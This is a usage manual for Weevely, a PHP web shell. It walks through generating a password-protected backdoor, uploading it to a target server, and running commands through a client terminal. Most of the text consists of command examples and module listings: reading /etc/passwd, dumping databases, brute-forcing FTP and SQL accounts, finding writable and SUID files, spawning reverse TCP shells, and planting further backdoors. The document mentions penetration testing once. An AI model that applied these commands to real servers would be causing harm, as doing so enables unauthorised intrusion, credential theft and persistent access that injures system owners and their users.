How to use weevely

    * Introduction
    * Install_server
    * Send_commands
    * Modules
          o Show_modules
          o Run_module
          o Set_module_arguments
    * Modules_list
          o Audit
          o SQL
          o File
          o Bruteforce
          o Find
          o Backdoor
          o System
    * Script_loading
          o Proxy_setting

== Introduction ==

Weevely is a PHP web shell that provide telnet-like console to execute system
commands and automatize administration and post-exploitation tasks.
Just generate and upload the server PHP code on the target web server, and run
Weevely client locally to transmit shell commands.

== Install server ==

Weevely needs a little PHP backdoor installed into target web server. First of
all generate the PHP code.


    # Usage: ./weevely generate <password> <output path>
    $ ./weevely.py generate p4ssw0rd ~/w.php
    + Backdoor file '~/w.php' created with password 'p4ssw0rd'.

Then upload w.php to the target web server, using legit user access or
exploiting web application bug in a successful pentration test.

== Send commands ==

Weevely provide a full working telnet-like terminal to send commands to the
target. At start, weevely detect automatically the best method to execute
system commands.

    # Usage: ./weevely <url> <password>
    $ ./weevely.py http://target.org/w.php p4ssw0rd

    [+] Starting terminal. Shell probe may take a while...
    [+] List modules with <tab> and show help with :show [module name]

    www-data@target.com:/var/www/$ uname
    Linux
    www-data@target.com:/var/www/$

In case of PHP configurations that inhibit system commands execution, a
fallback PHP shell is provided. PHP terminal prompt ends with (PHP)>, provide
ls and cd command substitutes and module executions.

Single commands can be also shot directly from command line

    # Usage: ./weevely <url> <password> &quot;<command>&quot;
    $ ./weevely.py http://target.org/w.php p4ssw0rd &quot;uname&quot;
    Linux
    $


== Modules ==

Weevely modular structure simplify administration and post-exploitation tasks.

== Show modules ==

Modules can be listed using prompt completion pressing <tab> button

    www-data@target.com:/var/www/$ : <tab>
    :audit.etc_passwd [filter]                              :bruteforce.sql_users <dbms> <lpath> [host]    :find.webdir [rpath]
    :audit.user_files [auto=] [list=] [path=]               :file.check <rpath> <mode>                     :shell.php <cmd> [mode=] [proxy=]
    :audit.user_web_files <url> <rpath> [deep]              :file.download <rpath> <lpath>                 :shell.sh <cmd> [stderr=]
    :backdoor.install <pwd> <rpath>                         :file.enum <lpath>                             :show
    :backdoor.reverse_tcp <host> <port>                     :file.read <rpath>                             :sql.console <dbms> <user> <pwd> [host]
    :backdoor.tcp <port>                                    :file.upload <lpath> <rpath>                   :sql.dump <dbms> <user> <pwd> <db> [table] [host]
    :bruteforce.ftp <user> <lpath> [sline] [host] [port]    :find.name [match] <str> <rpath>               :sql.query <dbms> <user> <pwd> <query> [host]
    :bruteforce.ftp_users <lpath> [host] [port]             :find.perms [qty=] [type=] [perm=] [rpath=]    :sql.summary <dbms> <user> <pwd> <db> [host]
    :bruteforce.sql <dbms> <user> <lpath> [sline] [host]    :find.suidsgid [type] [rpath]                  :system.info [info]
    www-data@target.com:/var/www/$ :

Run :show to print modules list, or :show <module name> to get detailed
information about a module.

    www-data@target.com:/var/www/$ :show file.upload

        [file.upload] Upload a file to the target filesystem
        Usage :file.upload <lpath> <rpath>

    lpath =                  Local file path
    rpath =                  Remote path
    vector =                 Specify vector (file_put_contents, fwrite)

    www-data@target.com:/var/www/$



== Run module ==

Call module running :<module> [options] with starting colon and eventual
trailing options, passed as arguments written with argument=value format.
Arguments included between angle brackets (<option>) are mandatories, while
ones between square brackets ([option]) are optionals.

    www-data@target.com:/var/www/$ :file.upload lpath=/tmp/myfile.sh rpath=myfile.sh
    [file.upload] File "myscript.sh" uploaded.
    www-data@target.com:/var/www/$

== Set module arguments ==

Modules options can be set for the entire session using :set <module> <options> .. 
using argument=value format. Successive module runs will use specified options.

    www-data@target.com:/var/www/$ :set file.upload lpath=/tmp/myfile.sh
    rpath=myfile.sh
    [file.upload] Values: <lpath=/etc/passwd> <rpath=file.txt> [vector=]
    www-data@target.com:/var/www/$ :run file.upload
    [file.upload] File 'myscript.sh' uploaded.
    www-data@target.com:/var/www/$

== Modules list ==

Use :show <module> to browse module descriptions, and :set <module> <options>.
Press <tab> to get module completion. List of available modules.

== Audit

Guess remote server files with weak permissions and enumerate /etc/passwd users
with different techniques.
    * audit.etc_passwd: Enumerate /etc/passwd users. Optional: try to [filter]
      to print only real users.
      Usage :audit.etc_passwd [filter]
    * audit.user_web_files: First crawl <url> web site, then enumerate files in
      corresponding <rpath> remote path searching for weak file permissions.
      Optional: crawl [deep] deepness
      Usage :audit.user_web_files <url> <rpath> [deep]
    * audit.user_files: Guess common files of system users. Choose [auto] to
      enumerate automatically files user (in /home/*/) or web (in /home/*/
      public_html). With [list] enumerate paths in /home/*/<words> getting
      words from local wordlist. With [path] enumerate single path in /home/*/
      <path>.
      Usage :audit.user_files [auto=] [list=] [path=]

== SQL

SQL console and modules to browse and dump target remote databases. For every
module, choose <dbms> from mysql or postgresql, user <user>, <pwd> password and
optionally and host [host] if different from localhost.
    * sql.console: Run SQL console.
    Usage :sql.console <dbms> <user> <pwd> [host]
    * sql.summary: Print SQL summary of database tables
    Usage :sql.summary <dbms> <user> <pwd> <db> [host]
    * sql.dump: Get SQL mysqldump-like dump of entire db or single [table]
    Usage :sql.dump <dbms> <user> <pwd> <db> [table] [host]
    * sql.query: Execute single SQL query
    Usage :sql.query <dbms> <user> <pwd> <query> [host]

== File

Transfer files with remote target filesystem
    * file.download: Download remote file from <rpath> to local <lpath>
      Usage :file.download <rpath> <lpath>
    * file.upload: Upload local file from <lpath> to remote <path>
      Usage :file.upload <lpath> <rpath>
    * file.read: Print remote file placed in <rpath> path
      Usage :file.read <rpath>
    * file.enum: Enumerate remote files written in local wordlist in <lpath>
          Usage :file.enum <lpath>
    * file.check: Return informations about remote file <rpath>. Use <mode> to
      check if file exists, if is dir or file, to get r|w|x permissions and md5
      hash.
      Usage :file.check <rpath> <mode>

== Bruteforce

Bruteforce single or multiple SQL and FTP accounts in target system. Optional
[host] is configurable if different from localhost. In ftp modules also [port]
different from 22 is changeable.
    * bruteforce.ftp_users: Bruteforce FTP password of every system users using
      local wordlist in <lpath>
          Usage :bruteforce.ftp_users <lpath> [host] [port]
    * bruteforce.ftp: Bruteforce single ftp user <user> using a local wordlist
      in <lpath>. Optional: start wordlist from line number [sline].
          Usage :bruteforce.ftp <user> <lpath> [sline] [host] [port]
    * bruteforce.sql_users: Bruteforce SQL password of every system users using
      local wordlist in <lpath>. Choose <dbms> from mysql or postgresql
          Usage :bruteforce.sql_users <dbms> <lpath> [host]
    * bruteforce.sql: Bruteforce single SQL user <user> using a local wordlist
      in <lpath>. Choose <dbms> from mysql or postgresql. Optional: start
      wordlist from line number [sline].
          Usage :bruteforce.sql <dbms> <user> <lpath> [sline] [host]

== Find

Find files in remote filesystem
    * find.name: Find files with name <str> starting from remote directory
      <rpath>. You can match if Match if Equal (e), Equal case insensitive
      (ei), Contains (c), Contains case insensitive (ci)
          Usage :find.name [match] <str> <rpath>
    * find.webdir: Starting from remote path [rpath], find a writable directory
      and guess corresponding URL.
          Usage :find.webdir [rpath]
    * find.perms: Find files by permissions. Choose if print first|any setting
      [qty], if search f|d|any file [type], with w|r|x|any permission as
      [perm], starting from remote path [rpath]
          Usage :find.perms [qty=] [type=] [perm=] [rpath=]
    * find.suidsgid: Find files with suid and sgid flags. Choose with [type] if
      find suid|sgid flagged files starting from remote path [rpath]
          Usage :find.suidsgid [type] [rpath]
== Backdoor

Spawn system backdoor with TCP ports and install new weevely PHP file.
    * backdoor.reverse_tcp: Send reverse TCP shell to port <port> of a remote
      <host>
      Usage :backdoor.reverse_tcp <host> <port>
    * backdoor.tcp: Spawn shell on TCP port <port>
    Usage :backdoor.tcp <port>
    * backdoor.install: Create another PHP backdoor with password <pwd> and
      upload to remote <rpath>
    Usage :backdoor.install <pwd> <rpath>

== System

Collect system informations
    * system.info: Collect system informations [info] choosen from whoami,
      hostname, basedir, uname, os, document_root, whoami, hostname, basedir,
      safe_mode, script, uname, os, client_ip
          Usage :system.info [info]

== Script loading ==
Script load read an ascii file executing any line as command. To load script at
runtime, use :load <script path>. Rc file ~/.weevely/weevely.rc is loaded at
start and usually set initial variables before others module load.

== Proxy setting ==
Rc file could be useful to set initial parameters like proxy URL.

    # ~/.weevely/weevely.rc contains
    # :set shell.php proxy=http://myproxy.com:8123

    $ ./weevely.py http://target.org/w.php p4ssw0rd

    [+] Starting terminal. Shell probe may take a while...
    [rc] :set shell.php proxy=&quot;http://myproxy.com:8123&quot;
    [shell.php] Values: <cmd=None> [mode=None] [proxy=http://myproxy.com:8123]
    [!] Proxies can break weevely requests, if possibile use proxychains

    [+] List modules with <tab> and show help with :show [module name]

    www-data@target.com:/var/www/$ :system.info client_ip
    myproxy.com
    www-data@target.com:/var/www/$

